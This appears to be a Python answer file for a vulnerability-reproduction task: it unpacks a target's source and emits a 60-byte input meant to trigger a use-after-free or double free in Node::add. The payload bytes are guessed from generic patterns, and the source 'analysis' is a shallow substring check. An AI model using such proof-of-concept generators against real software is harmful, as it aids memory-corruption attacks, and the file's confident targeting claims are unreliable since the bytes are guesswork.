import os
import tarfile
import tempfile
import subprocess
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Look for the main source file - common patterns
            source_dir = Path(tmpdir)
            cpp_files = list(source_dir.rglob("*.cpp")) + list(source_dir.rglob("*.cc")) + list(source_dir.rglob("*.cxx"))
            cpp_files += list(source_dir.rglob("*.c"))
            
            # If no source files found in root, look one level deeper
            if not cpp_files:
                for item in source_dir.iterdir():
                    if item.is_dir():
                        cpp_files.extend(item.rglob("*.cpp"))
                        cpp_files.extend(item.rglob("*.cc"))
                        cpp_files.extend(item.rglob("*.cxx"))
                        cpp_files.extend(item.rglob("*.c"))
            
            # Read source files to understand the format
            input_format = self._analyze_source(cpp_files)
            
            # Generate PoC based on analysis or use default
            if input_format:
                poc = self._generate_targeted_poc(input_format)
            else:
                # Default PoC: trigger exception in Node::add
                # Common pattern: create structure that causes double free when exception is thrown
                # Using 60 bytes as specified
                poc = self._generate_default_poc()
            
            return poc
    
    def _analyze_source(self, source_files):
        """Analyze source code to understand input format."""
        for file_path in source_files[:5]:  # Check first few files
            try:
                with open(file_path, 'r') as f:
                    content = f.read()
                    
                    # Look for common input reading patterns
                    if 'std::cin' in content or 'scanf' in content or 'fread' in content:
                        # Try to determine if it's binary or text
                        if 'read(' in content or 'fread' in content:
                            return {'type': 'binary', 'size_hint': 60}
                        else:
                            return {'type': 'text'}
                            
            except:
                continue
        return None
    
    def _generate_targeted_poc(self, format_info):
        """Generate targeted PoC based on format analysis."""
        if format_info.get('type') == 'binary':
            # Create binary data that likely triggers the vulnerability
            # Pattern: create nodes with reference cycles or invalid data
            # that causes Node::add to throw exception after allocation
            
            # Common vulnerability pattern:
            # 1. Header/metadata
            # 2. Node definitions
            # 3. References that cause exception
            
            # 60 bytes structure:
            # - 4 bytes: magic/number of nodes
            # - Rest: node data that causes exception in add()
            
            poc = bytearray()
            
            # Create structure with 3 nodes (common for double-free scenarios)
            poc.extend(b'\x03\x00\x00\x00')  # 3 nodes
            
            # Node 0: valid data
            poc.extend(b'\x01\x00\x00\x00')  # Node ID 1
            poc.extend(b'\x02\x00\x00\x00')  # Child count: 2
            
            # Node 1: will cause exception in add()
            poc.extend(b'\x02\x00\x00\x00')  # Node ID 2
            poc.extend(b'\xff\xff\xff\xff')  # Invalid child count or trigger
            
            # Node 2: normal node
            poc.extend(b'\x03\x00\x00\x00')  # Node ID 3
            poc.extend(b'\x00\x00\x00\x00')  # No children
            
            # Fill remaining bytes to reach 60
            remaining = 60 - len(poc)
            poc.extend(b'\xcc' * remaining)
            
            return bytes(poc[:60])
        
        else:
            # Text format - create input that triggers exception
            lines = [
                "3",  # Number of nodes
                "1 2",  # Node 1 with 2 children
                "2 -1",  # Node 2 with invalid data causing exception
                "3 0"   # Node 3 with 0 children
            ]
            text = "\n".join(lines)
            # Pad to 60 bytes if needed
            if len(text) < 60:
                text += "#" * (60 - len(text))
            return text[:60].encode()
    
    def _generate_default_poc(self):
        """Generate default PoC for heap use-after-free in Node::add."""
        # Based on common vulnerability patterns:
        # 1. Create nodes
        # 2. Trigger exception in add() method
        # 3. Cause double free during cleanup
        
        # Binary structure (60 bytes):
        # Bytes 0-3: Number of nodes (3)
        # Rest: Node data designed to trigger the vulnerability
        
        poc = bytearray(60)
        
        # Set number of nodes to 3
        poc[0:4] = b'\x03\x00\x00\x00'
        
        # Create malformed node data that will cause Node::add to throw
        # The exact pattern depends on the implementation, but we can try:
        # - Invalid child references
        # - Self-references
        # - Out of bounds indices
        
        # At offset 4: First node (ID 1)
        poc[4:8] = b'\x01\x00\x00\x00'  # Node ID
        poc[8:12] = b'\x02\x00\x00\x00'  # 2 children
        
        # At offset 12: Second node (ID 2) - will cause exception
        poc[12:16] = b'\x02\x00\x00\x00'  # Node ID
        poc[16:20] = b'\xff\xff\xff\x7f'  # Large/invalid child count
        
        # At offset 20: Third node (ID 3)
        poc[20:24] = b'\x03\x00\x00\x00'  # Node ID
        poc[24:28] = b'\x00\x00\x00\x00'  # 0 children
        
        # Fill the rest with pattern that might trigger edge cases
        # Using 0xCC as filler (common debug pattern)
        for i in range(28, 60):
            poc[i] = 0xCC
        
        return bytes(poc)
